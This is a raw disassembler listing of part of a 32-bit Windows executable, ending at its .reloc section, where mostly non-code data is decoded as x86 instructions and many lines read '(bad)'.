  40b6fd:	scas   al,BYTE PTR es:[edi]
  40b6fe:	(bad)  
  40b700:	adc    DWORD PTR [edi-0x6cfe0026],ebx
  40b706:	aad    0xff
  40b708:	add    BYTE PTR [ebx-0x74ff002d],cl
  40b70e:	fdivr  st,st(7)
  40b710:	and    al,0x89
  40b712:	sar    bh,0x41
  40b715:	js     0x40b6b1
  40b717:	inc    DWORD PTR [eax]
	...
  40b751:	add    BYTE PTR [eax],al
  40b753:	add    BYTE PTR [ebp-0x7a],dl
  40b756:	mov    ds:0xc59d43ff,al
  40b75b:	jmp    FWORD PTR ds:0x55fff3bf
  40b761:	into   
  40b762:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b769:	jmp    0xe2c9b763
  40b76e:	repnz (bad) 
  40b770:	js     0x40b74b
  40b772:	out    dx,eax
  40b773:	jmp    DWORD PTR [eax-0x36]
  40b776:	jmp    0x2eff:0xe5ba45ff
  40b77d:	scas   al,BYTE PTR es:[edi]
  40b77e:	loopne 0x40b77f
  40b780:	adc    bl,BYTE PTR [edi-0x6dfe0026]
  40b786:	aad    0xff
  40b788:	add    BYTE PTR [ebx-0x74ff002d],cl
  40b78e:	fdivr  st,st(7)
  40b790:	and    al,0x89
  40b792:	sar    bh,0x41
  40b795:	js     0x40b731
  40b797:	inc    DWORD PTR [eax]
	...
  40b7d1:	add    BYTE PTR [eax],al
  40b7d3:	add    BYTE PTR [ebp-0x7a],dl
  40b7d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7d7:	inc    DWORD PTR [edi+ebx*4-0x38]
  40b7db:	jmp    FWORD PTR ds:0x55fff3bf
  40b7e1:	into   
  40b7e2:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b7e9:	jmp    0xe2cab7e3
  40b7ee:	repz (bad) 
  40b7f0:	jns    0x40b7ca
  40b7f2:	out    dx,eax
  40b7f3:	jmp    DWORD PTR [eax-0x36]
  40b7f6:	jmp    0xe4fafdfa
  40b7fb:	jmp    FWORD PTR ds:0x11ffe0ad
  40b801:	sahf   
  40b802:	(bad)  
  40b804:	add    DWORD PTR [edx-0x74ff002a],edx
  40b80a:	sar    edi,cl
  40b80c:	add    BYTE PTR [ebx-0x76da0028],cl
  40b812:	sar    bh,0x41
  40b815:	jns    0x40b7b4
  40b817:	inc    DWORD PTR [eax]
	...
  40b851:	add    BYTE PTR [eax],al
  40b853:	add    BYTE PTR [ebp-0x77],dl
  40b856:	test   al,0xff
  40b858:	inc    esi
  40b859:	mov    al,ds:0xbf2dffc9
  40b85e:	bnd call DWORD PTR [ebp-0x32]
  40b862:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b869:	call   0xe1cab863
  40b86e:	repnz (bad) 
  40b870:	jns    0x40b84a
  40b872:	out    dx,eax
  40b873:	jmp    DWORD PTR [eax-0x36]
  40b876:	jmp    0x2dff:0xe4ba45ff
  40b87d:	scas   al,BYTE PTR es:[edi]
  40b87e:	(bad)  
  40b880:	adc    DWORD PTR [edi-0x6dfe0026],ebx
  40b886:	aad    0xff
  40b888:	add    BYTE PTR [ebx-0x74ff002d],cl
  40b88e:	xlat   BYTE PTR ds:[ebx]
  40b88f:	jmp    DWORD PTR [esi]
  40b891:	mov    eax,ecx
  40b893:	inc    DWORD PTR [ecx+0x7c]
  40b896:	lahf   
  40b897:	inc    DWORD PTR [eax]
	...
  40b8d1:	add    BYTE PTR [eax],al
  40b8d3:	add    BYTE PTR [esi-0x75],dl
  40b8d6:	test   eax,0xcaa246ff
  40b8db:	jmp    FWORD PTR [edi+edi*4]
  40b8de:	bnd call DWORD PTR [ebp-0x32]
  40b8e2:	repnz inc DWORD PTR [ecx-0x6a000b1f]
  40b8e9:	call   0xe1cab8e3
  40b8ee:	repnz (bad) 
  40b8f0:	jns    0x40b8ca
  40b8f2:	lock jmp DWORD PTR [eax-0x36]
  40b8f6:	jmp    0x2dff:0xe4ba45ff
  40b8fd:	lods   eax,DWORD PTR ds:[esi]
  40b8fe:	(bad)  
  40b900:	adc    DWORD PTR [edi-0x6cfe0026],ebx
  40b906:	aad    0xff
  40b908:	add    BYTE PTR [ebx-0x75ff002d],cl
  40b90e:	xlat   BYTE PTR ds:[ebx]
  40b90f:	jmp    DWORD PTR [edi]
  40b911:	mov    eax,ecx
  40b913:	inc    DWORD PTR [edx+0x7d]
  40b916:	mov    al,ds:0xff
	...
  40b953:	add    BYTE PTR [edi-0x75],dl
  40b956:	stos   BYTE PTR es:[edi],al
  40b957:	jmp    FWORD PTR [eax-0x4b]
  40b95a:	sar    edi,cl
  40b95c:	ins    DWORD PTR es:[edi],dx
  40b95d:	xlat   BYTE PTR ds:[ebx]
  40b95e:	stc    
  40b95f:	call   DWORD PTR [esp+eiz*8-0xc460007]
  40b966:	cld    
  40b967:	dec    edx
  40b969:	cli    
  40b96a:	(bad)  
  40b96b:	dec    ebx
  40b96d:	cli    
  40b96e:	(bad)  
  40b96f:	dec    edi
  40b971:	cld    
  40b972:	(bad)  
  40b973:	dec    esi
  40b975:	(bad)  
  40b976:	(bad)  
  40b977:	inc    esi
  40b979:	std    
  40b97a:	(bad)  
  40b97b:	(bad)  
  40b97c:	mov    ecx,0xa2fffcf7
  40b981:	in     al,dx
  40b982:	clc    
  40b983:	inc    DWORD PTR [eax+0x5cfff1da]
  40b989:	(bad)  
  40b98a:	jmp    0x37ff:0xe5b22bff
  40b991:	call   0xffa1:0x7e43ffc7
	...
  40b9d4:	ins    BYTE PTR es:[edi],dx
  40b9d5:	lahf   
  40b9d6:	mov    ch,0xe4
  40b9d8:	scas   eax,DWORD PTR es:[edi]
  40b9d9:	fucomip st,st(2)
  40b9db:	dec    edx
  40b9dd:	cli    
  40b9de:	(bad)  
  40b9df:	(bad)  
  40b9e0:	(bad)  
  40b9e2:	(bad)  
  40b9e3:	(bad)  
  40b9e4:	fdivp  st(7),st
  40b9e6:	(bad)  
  40b9e7:	(bad)  
  40b9e8:	fcos   
  40b9ea:	(bad)  
  40b9eb:	call   esi
  40b9ed:	(bad)  
  40b9ee:	(bad)  
  40b9ef:	call   esp
  40b9f1:	(bad)  
  40b9f2:	(bad)  
  40b9f3:	call   edx
  40b9f5:	(bad)  
  40b9f6:	(bad)  
  40b9f7:	call   eax
  40b9f9:	(bad)  
  40b9fa:	(bad)  
  40b9fb:	dec    ebp
  40b9fd:	(bad)  
  40b9fe:	(bad)  
  40b9ff:	dec    edx
  40ba01:	(bad)  
  40ba02:	(bad)  
  40ba03:	dec    eax
  40ba05:	(bad)  
  40ba06:	(bad)  
  40ba07:	inc    ebp
  40ba09:	std    
  40ba0a:	(bad)  
  40ba0b:	push   DWORD PTR [eax-0x5b000008]
  40ba11:	jmp    0xfca9:0x8f56fff4
	...
  40ba54:	pop    esp
  40ba55:	nop
  40ba56:	lods   eax,DWORD PTR ds:[esi]
  40ba57:	xor    ebx,DWORD PTR [esi-0x67]
  40ba5a:	mov    dh,0xa3
  40ba5c:	jb     0x40ba0f
  40ba5e:	leave  
  40ba5f:	cld    
  40ba60:	mov    al,ch
  40ba62:	xlat   BYTE PTR ds:[ebx]
  40ba63:	jmp    DWORD PTR [edi-0x42001c26]
  40ba69:	jmp    0x40ba59
  40ba6b:	inc    esi
  40ba6d:	repnz cmc 
  40ba6f:	dec    edi
  40ba71:	clc    
  40ba72:	sti    
  40ba73:	call   ecx
  40ba75:	(bad)  
  40ba76:	(bad)  
  40ba77:	dec    edx
  40ba79:	cli    
  40ba7a:	cld    
  40ba7b:	(bad)  
  40ba7c:	mov    ecx,0xa1fff4f0
  40ba81:	loop   0x40ba6f
  40ba83:	inc    DWORD PTR [ebx+0x6fffe2ce]
  40ba89:	mov    ebp,0xb366ffd7
  40ba8e:	int    0xff
  40ba90:	ins    DWORD PTR es:[edi],dx
  40ba91:	scas   eax,DWORD PTR es:[edi]
  40ba92:	mov    ecx,0x33a98c56
	...
  40bad8:	pop    ebp
  40bad9:	xchg   ecx,eax
  40bada:	scas   al,BYTE PTR es:[edi]
  40badb:	add    ebx,DWORD PTR [ebp-0x6e]
  40bade:	scas   al,BYTE PTR es:[edi]
  40badf:	sbb    DWORD PTR [ebp-0x6e],ebx
  40bae2:	lods   eax,DWORD PTR ds:[esi]
  40bae3:	cmp    bl,BYTE PTR [ebp-0x70]
  40bae6:	lods   eax,DWORD PTR ds:[esi]
  40bae7:	addr16 pop ebp
  40bae9:	nop
  40baea:	lods   eax,DWORD PTR ds:[esi]
  40baeb:	cwde   
  40baec:	pop    esp
  40baed:	nop
  40baee:	lods   eax,DWORD PTR ds:[esi]
  40baef:	rcr    DWORD PTR [ecx-0x71],0xac
  40baf3:	out    0x59,al
  40baf5:	(bad)  
  40baf6:	lods   al,BYTE PTR ds:[esi]
  40baf7:	stc    
  40baf8:	pop    ecx
  40baf9:	(bad)  
  40bafa:	lods   al,BYTE PTR ds:[esi]
  40bafb:	jmp    0xc7ed4859
  40bb00:	pop    ecx
  40bb01:	lea    ebp,[esp+ebx*4+0x6bac8d58]
  40bb08:	push   edi
  40bb09:	mov    WORD PTR [ebx-0x5473a8c0],gs
  40bb0f:	sbb    al,0x56
  40bb11:	lea    ebp,[ecx+0x5]
	...
  40bbbf:	add    bh,bh
  40bbc1:	(bad)  
  40bbc2:	(bad)  
  40bbc3:	(bad)  
  40bbc4:	(bad)  
  40bbc5:	(bad)  
  40bbc6:	(bad)  
  40bbc7:	(bad)  
  40bbc8:	(bad)  
  40bbc9:	(bad)  
  40bbca:	(bad)  
  40bbcb:	(bad)  
  40bbcc:	(bad)  
  40bbcd:	(bad)  
  40bbce:	(bad)  
  40bbcf:	(bad)  
  40bbd0:	(bad)  
  40bbd1:	inc    BYTE PTR [eax]
  40bbd3:	pop    es
  40bbd4:	(bad)  
  40bbd5:	inc    BYTE PTR [eax]
  40bbd7:	add    edi,edi
  40bbd9:	inc    BYTE PTR [eax]
  40bbdb:	add    edi,edi
  40bbdd:	inc    BYTE PTR [eax]
  40bbdf:	add    edi,esp
  40bbe1:	add    BYTE PTR [eax],al
  40bbe3:	add    edi,eax
  40bbe5:	add    BYTE PTR [eax],al
  40bbe7:	add    edi,eax
  40bbe9:	add    BYTE PTR [eax],al
  40bbeb:	add    edi,eax
  40bbed:	add    BYTE PTR [eax],al
  40bbef:	add    eax,edi
  40bbf1:	add    BYTE PTR [eax],al
  40bbf3:	add    eax,edi
  40bbf5:	add    BYTE PTR [eax],al
  40bbf7:	add    eax,edi
  40bbf9:	add    BYTE PTR [eax],al
  40bbfb:	add    eax,edi
  40bbfd:	add    BYTE PTR [eax],al
  40bbff:	add    eax,edi
  40bc01:	add    BYTE PTR [eax],al
  40bc03:	add    eax,edi
  40bc05:	add    BYTE PTR [eax],al
  40bc07:	add    eax,edi
  40bc09:	add    BYTE PTR [ebx],al
  40bc0b:	(bad)  
  40bc0c:	clc    
  40bc0d:	add    BYTE PTR [ebx],al
  40bc0f:	(bad)  
  40bc10:	clc    
  40bc11:	add    BYTE PTR [ebx],al
  40bc13:	(bad)  
  40bc14:	clc    
  40bc15:	add    BYTE PTR [ebx],al
  40bc17:	(bad)  
  40bc18:	clc    
  40bc19:	add    BYTE PTR [ebx],al
  40bc1b:	(bad)  
  40bc1c:	clc    
  40bc1d:	add    BYTE PTR [ebx],al
  40bc1f:	(bad)  
  40bc20:	clc    
  40bc21:	add    BYTE PTR [ebx],al
  40bc23:	(bad)  
  40bc24:	clc    
  40bc25:	add    BYTE PTR [ebx],al
  40bc27:	(bad)  
  40bc28:	clc    
  40bc29:	add    BYTE PTR [ebx],al
  40bc2b:	(bad)  
  40bc2c:	clc    
  40bc2d:	add    BYTE PTR [ebx],al
  40bc2f:	(bad)  
  40bc30:	clc    
  40bc31:	add    BYTE PTR [ebx],al
  40bc33:	(bad)  
  40bc34:	clc    
  40bc35:	add    BYTE PTR [ebx],al
  40bc37:	(bad)  
  40bc38:	cld    
  40bc39:	add    BYTE PTR [edi],al
  40bc3b:	(bad)  
  40bc3c:	(bad)  
  40bc3d:	(bad)  
  40bc3e:	(bad)  
  40bc3f:	jmp    FWORD PTR [eax]
  40bc41:	add    BYTE PTR [eax],al
  40bc43:	add    BYTE PTR [eax],dl
  40bc45:	add    BYTE PTR [eax],al
  40bc47:	add    BYTE PTR [eax],ah
  40bc49:	add    BYTE PTR [eax],al
  40bc4b:	add    BYTE PTR [ecx],al
  40bc4d:	add    BYTE PTR [eax],ah
  40bc4f:	add    BYTE PTR [eax],al
  40bc51:	add    BYTE PTR [eax],al
  40bc53:	add    BYTE PTR [eax+0x4],al
	...
  40bcbe:	add    BYTE PTR [eax],al
  40bcc0:	scas   al,BYTE PTR es:[edi]
  40bcc1:	js     0x40bcd7
  40bcc3:	xchg   ebx,eax
  40bcc4:	mov    ch,0x86
  40bcc6:	xor    al,ch
  40bcc8:	mov    al,0x7c
  40bcca:	and    ebx,ebp
  40bccc:	mov    bl,0x7f
  40bcce:	and    ebp,ebx
  40bcd0:	mov    dh,0x80
  40bcd2:	and    eax,0x1e7cb7eb
  40bcd7:	jmp    0x40bc91
  40bcd9:	jnp    0x40bcf9
  40bcdb:	jmp    0x40bc98
  40bcdd:	test   BYTE PTR [ebx],ch
  40bcdf:	fisubr WORD PTR [ebx+0x730971]
	...
  40bcfd:	add    BYTE PTR [eax],al
  40bcff:	add    BYTE PTR [edi-0x472ccd77],dh
  40bd05:	xchg   esp,eax
  40bd06:	dec    edi
  40bd07:	push   DWORD PTR [eax-0x4c00d380]
  40bd0d:	jl     0x40bd31
  40bd0f:	inc    ecx
  40bd11:	and    DWORD PTR [edi],0x4895d6ff
  40bd17:	(bad)  
  40bd18:	fmul   DWORD PTR [esp+eax*2+0x5794dbff]
  40bd1f:	push   DWORD PTR [edi-0x5b2cdd81]
  40bd25:	imul   eax,DWORD PTR [eax],0x6
	...
  40bd3f:	add    BYTE PTR [edx-0x4959dd81],dh
  40bd45:	mov    DWORD PTR ds:0x6bb5d5ff,ebp
  40bd4b:	(bad)  
  40bd4c:	(bad)  
  40bd4d:	(bad)  
  40bd4e:	(bad)  
  40bd4f:	call   ebx
  40bd51:	call   0xffa7:0xd9f6ff32
  40bd58:	(bad)  
  40bd59:	(bad)  
  40bd5a:	(bad)  
  40bd5b:	(bad)  
  40bd5c:	(bad)  
  40bd5d:	(bad)  
  40bd5e:	(bad)  
  40bd5f:	(bad)  
  40bd60:	mov    edi,0xa6e22b84
  40bd65:	ins    BYTE PTR es:[edi],dx
  40bd66:	add    BYTE PTR [ecx],ah
  40bd68:	add    BYTE PTR [eax],al
  40bd6a:	add    BYTE PTR [eax],al
  40bd6c:	inc    esi
  40bd6d:	ins    DWORD PTR es:[edi],dx
  40bd6e:	mov    BYTE PTR [edx],bl
  40bd70:	inc    esi
  40bd71:	ins    DWORD PTR es:[edi],dx
  40bd72:	mov    BYTE PTR [ecx+0x49],dh
  40bd75:	je     0x40bd07
  40bd77:	test   al,0x48
  40bd79:	jbe    0x40bd0d
  40bd7b:	retf   
  40bd7c:	inc    ebx
  40bd7d:	jb     0x40bd0d
  40bd7f:	retf   0x707b
  40bd82:	inc    esp
  40bd83:	aam    0xbd
  40bd85:	mov    WORD PTR ds:0x2897cbff,gs
  40bd8b:	(bad)  
  40bd8c:	sti    
  40bd8d:	in     al,0xad
  40bd8f:	(bad)  
  40bd90:	(bad)  
  40bd91:	(bad)  
  40bd92:	(bad)  
  40bd93:	(bad)  
  40bd94:	jmp    0x3091:0xddff5ab8
  40bd9b:	call   ecx
  40bd9d:	ja     0x40bdc7
  40bd9f:	inc    edi
  40bda1:	mov    bh,BYTE PTR [ecx+edi*8]
  40bda4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bda5:	ins    BYTE PTR es:[edi],dx
  40bda6:	add    BYTE PTR [edx+0x0],al
  40bda9:	add    BYTE PTR [eax],al
  40bdab:	add    BYTE PTR [edx+0x6f],al
  40bdae:	mov    ?,WORD PTR [ebp+0x4d]
  40bdb1:	lea    ebp,[ebp-0x27449c1c]
  40bdb7:	call   FWORD PTR [edx-0x3d]
  40bdba:	out    0xff,eax
  40bdbc:	xor    al,0xb0
  40bdbe:	in     al,0xff
  40bdc0:	inc    ebp
  40bdc1:	mov    BYTE PTR [esi+0x3f98c5ff],cl
  40bdc7:	inc    esp
  40bdc9:	xchg   BYTE PTR [esi],cl
  40bdcb:	call   ebx
  40bdcd:	xchg   ecx,eax
  40bdce:	or     al,0xff
  40bdd0:	not    dh
  40bdd2:	test   edi,edi
  40bdd4:	(bad)  
  40bdd5:	(bad)  
  40bdd6:	(bad)  
  40bdd7:	(bad)  
  40bdd8:	(bad)  
  40bdd9:	(bad)  
  40bdda:	(bad)  
  40bddb:	dec    ebx
  40bddd:	popa   
  40bdde:	add    bh,bh
  40bde0:	retf   
  40bde1:	test   DWORD PTR [edi+edi*8],esi
  40bde4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bde5:	ins    DWORD PTR es:[edi],dx
  40bde6:	add    esp,DWORD PTR [ebx+0x0]
  40bde9:	add    BYTE PTR [eax],al
  40bdeb:	add    BYTE PTR [esi],dh
  40bded:	jl     0x40bd8f
  40bdef:	out    0x52,eax
  40bdf1:	int3   
  40bdf2:	icebp  
  40bdf3:	call   DWORD PTR [ebx+0x7afff6e9]
  40bdf9:	fdivr  st(2),st
  40bdfb:	inc    DWORD PTR [edx-0x44]
  40bdfe:	out    0xff,eax
  40be00:	sub    eax,0xc0ffac92
  40be05:	mov    al,ds:0xa7d6ff54
  40be0a:	inc    esp
  40be0b:	(bad)  
  40be0c:	fisub  DWORD PTR [ecx+esi*1-0x62210601]
  40be13:	(bad)  
  40be14:	(bad)  
  40be15:	(bad)  
  40be16:	(bad)  
  40be17:	(bad)  
  40be18:	jmp    0x1187:0xdaff44b1
  40be1f:	(bad)  
  40be20:	fcom   DWORD PTR [edi+0x7ab0ff40]
  40be26:	pop    ss
  40be27:	mov    eax,DWORD PTR [eax]
  40be29:	add    BYTE PTR [eax],al
  40be2b:	add    BYTE PTR [edi],dh
  40be2d:	and    DWORD PTR [ebp-0x92fb102],0xf4e792ff
  40be37:	(bad)  
  40be38:	jns    0x40be12
  40be3a:	out    dx,eax
  40be3b:	inc    DWORD PTR [ebx-0x46]
  40be3e:	in     al,0xff
  40be40:	sbb    edx,DWORD PTR [edi-0x6a57003a]
  40be46:	push   ebx
  40be47:	(bad)  
  40be48:	out    dx,al
  40be49:	mov    esp,0xddf6ff50
  40be4e:	mov    ds:0xf8ffffff,al
  40be53:	(bad)  
  40be54:	out    dx,al
  40be55:	mov    esp,0xbceeff50
  40be5a:	push   eax
  40be5b:	(bad)  
  40be5c:	out    dx,eax
  40be5d:	mov    ebx,0xc1eeff57
  40be62:	jne    0x40be63
  40be64:	mov    edi,0xb9308c
  40be69:	add    BYTE PTR [eax],al
  40be6b:	add    BYTE PTR [ebx],bh
  40be6d:	test   DWORD PTR [edi-0xb30b212],esp
  40be73:	call   DWORD PTR [edx+0x79fff4e7]
  40be79:	fsubr  st,st(7)
  40be7b:	inc    DWORD PTR [ebx-0x46]
  40be7e:	jecxz  0x40be7f
  40be80:	setnp  al
  40be83:	inc    DWORD PTR [ebx-0x1100ab7c]
  40be89:	mov    esp,0xfefeff50
  40be8e:	(bad)  
  40be8f:	(bad)  
  40be90:	out    dx,al
  40be91:	mov    esp,0xd8fbff50
  40be96:	mov    edi,?
  40be98:	cld    
  40be99:	ficom  DWORD PTR [ebx-0x6e250201]
  40be9f:	(bad)  
  40bea0:	jmp    esp
  40bea2:	test   eax,0x449ac7ff
  40bea7:	fild   WORD PTR [eax]
  40bea9:	add    BYTE PTR [eax],al
  40beab:	add    BYTE PTR [ebx],bh
  40bead:	xchg   BYTE PTR [edi-0xb31b212],ah
  40beb3:	call   DWORD PTR [edx+0x7afff4e7]
  40beb9:	fldz   
  40bebb:	inc    DWORD PTR [edx+edi*4-0x1c]
  40bebf:	call   DWORD PTR [eax]
  40bec1:	fdivr  st,st(7)
  40bec4:	sub    al,0x82
  40bec6:	sahf   
  40bec7:	jmp    DWORD PTR [esi-0x3903b275]
  40becd:	cwde   
  40bece:	inc    ebx
  40becf:	jmp    0x40be96
  40bed1:	xchg   ebp,eax
  40bed2:	ds jmp 0x40be9b
  40bed5:	cwde   
  40bed6:	inc    ebx
  40bed7:	jmp    0x40be9f
  40bed9:	cdq    
  40beda:	inc    esp
  40bedb:	jmp    0x40bea3
  40bedd:	cdq    
  40bede:	inc    esp
  40bedf:	jmp    0x40bea8
  40bee1:	call   0x9718:0x7bb1e948
  40bee8:	add    BYTE PTR [eax],al
  40beea:	add    BYTE PTR [eax],al
  40beec:	cmp    al,0x87
  40beee:	test   eax,0xf3cc48ee
  40bef3:	dec    DWORD PTR [ebp+0x70fff3e6]
  40bef9:	aam    0xed
  40befb:	push   DWORD PTR ds:0x3ffe0b2
  40bf01:	xchg   esp,eax
  40bf02:	aad    0xff
  40bf04:	add    BYTE PTR [ebx+edx*8-0x608acf01],al
  40bf0b:	out    dx,al
	...
  40bf2c:	aas    
  40bf2d:	mov    DWORD PTR [edx-0x92ca111],ebp
  40bf33:	jmp    FWORD PTR [eax-0x62000812]
  40bf39:	out    0xf4,eax
  40bf3b:	(bad)  
  40bf3c:	js     0x40bf12
  40bf3e:	out    dx,al
  40bf3f:	inc    DWORD PTR [esi-0x49]
  40bf42:	jecxz  0x40bf43
  40bf44:	adc    BYTE PTR [eax+0x782fffda],bl
  40bf4a:	mov    al,ds:0xef
	...
  40bf6b:	add    BYTE PTR [ebp-0x5f],ch
  40bf6e:	mov    ch,0xe9
  40bf70:	mov    esi,0xddfffbf6
  40bf75:	(bad)  
  40bf76:	(bad)  
  40bf77:	(bad)  
  40bf78:	(bad)  
  40bf7a:	(bad)  
  40bf7b:	(bad)  
  40bf7c:	fdivr  st,st(7)
  40bf7e:	(bad)  
  40bf7f:	inc    ebp
  40bf81:	std    
  40bf82:	(bad)  
  40bf83:	call   DWORD PTR [ebp+0x5afff8e7]
  40bf89:	cwde   
  40bf8a:	mov    al,0xe9
	...
  40bfac:	popa   
  40bfad:	(bad)  
  40bfae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfaf:	jbe    0x40bf3a
  40bfb1:	mov    edx,0xd5a9e5cb
  40bfb6:	(bad)  
  40bfb8:	mov    bl,0xdf
  40bfba:	in     eax,0xff
  40bfbc:	scas   al,BYTE PTR es:[edi]
  40bfbd:	fucom  st(5)
  40bfbf:	call   DWORD PTR [ebp+ecx*8-0x4d8d0426]
  40bfc6:	(bad)  
  40bfc7:	in     eax,0x58
  40bfc9:	mov    DWORD PTR [eax+0x76],esp
	...
  40bfeb:	add    BYTE PTR [ecx-0x7a],bl
  40bfee:	sahf   
  40bfef:	sbb    bl,BYTE PTR [ebp-0x74]
  40bff2:	mov    ds:0xa7936671,eax
  40bff7:	test   al,0x67
  40bff9:	xchg   esp,eax
  40bffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bffb:	retf   
  40bffc:	xchg   bx,ax
  40bffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfff:	retf   
  40c000:	pop    ebp
  40c001:	lea    esp,[eax+ebp*4+0x719f8754]
  40c008:	push   ebx
  40c009:	adc    DWORD PTR [edi+0x1a],0x0
	...
  40c067:	add    bh,bh
  40c069:	inc    DWORD PTR [eax]
  40c06b:	add    ah,bh
  40c06d:	add    DWORD PTR [eax],eax
  40c06f:	add    ah,bh
  40c071:	add    BYTE PTR [eax],al
  40c073:	add    ah,bh
  40c075:	add    BYTE PTR [eax],al
  40c077:	add    BYTE PTR [eax-0x80000000],al
  40c07d:	add    BYTE PTR [eax],al
  40c07f:	add    BYTE PTR [eax-0x80000000],al
  40c085:	add    BYTE PTR [eax],al
  40c087:	add    BYTE PTR [eax-0x80000000],al
  40c08d:	add    BYTE PTR [eax],al
  40c08f:	add    BYTE PTR [eax-0x7fffff81],al
  40c095:	jg     0x40c097
  40c097:	add    BYTE PTR [eax-0x7fffff81],al
  40c09d:	jg     0x40c09f
  40c09f:	add    BYTE PTR [eax-0xffff81],al
  40c0a5:	inc    DWORD PTR [eax]
  40c0a7:	add    BYTE PTR [eax],al
  40c0a9:	add    BYTE PTR [ecx],al
  40c0ab:	add    BYTE PTR [esi],al
  40c0ad:	add    BYTE PTR [eax],dh
  40c0af:	xor    BYTE PTR [eax],al
  40c0b1:	add    BYTE PTR [ecx],al
  40c0b3:	add    BYTE PTR [eax],cl
  40c0b5:	add    BYTE PTR [eax+0x100000e],ch
  40c0bb:	add    BYTE PTR [eax],ah
  40c0bd:	and    BYTE PTR [eax],al
  40c0bf:	add    BYTE PTR [ecx],al
  40c0c1:	add    BYTE PTR [eax],cl
  40c0c3:	add    BYTE PTR [eax+0x2000008],ch
  40c0c9:	add    BYTE PTR [eax],dl
  40c0cb:	adc    BYTE PTR [eax],al
  40c0cd:	add    BYTE PTR [ecx],al
  40c0cf:	add    BYTE PTR [eax],cl
  40c0d1:	add    BYTE PTR [eax+0x5],ch
  40c0d4:	add    BYTE PTR [eax],al
  40c0d6:	add    eax,DWORD PTR [eax]
  40c0d8:	xor    BYTE PTR [eax],dh
  40c0da:	add    BYTE PTR [eax],al
  40c0dc:	add    DWORD PTR [eax],eax
  40c0de:	and    BYTE PTR [eax],al
  40c0e0:	test   al,0x25
  40c0e2:	add    BYTE PTR [eax],al
  40c0e4:	add    al,0x0
  40c0e6:	and    BYTE PTR [eax],ah
  40c0e8:	add    BYTE PTR [eax],al
  40c0ea:	add    DWORD PTR [eax],eax
  40c0ec:	and    BYTE PTR [eax],al
  40c0ee:	test   al,0x10
  40c0f0:	add    BYTE PTR [eax],al
  40c0f2:	add    eax,0x101000
  40c0f7:	add    BYTE PTR [ecx],al
  40c0f9:	add    BYTE PTR [eax],ah
  40c0fb:	add    BYTE PTR [eax+0x4],ch
  40c0fe:	add    BYTE PTR [eax],al
  40c100:	push   es
  40c101:	add    BYTE PTR [eax],al
  40c103:	add    BYTE PTR [eax],al
  40c105:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040e000 <.reloc>:
  40e000:	add    BYTE PTR [eax+0x0],dl
  40e003:	add    BYTE PTR [eax+eax*1],cl
  40e006:	add    BYTE PTR [eax],al
  40e008:	jo     0x40e045
	...
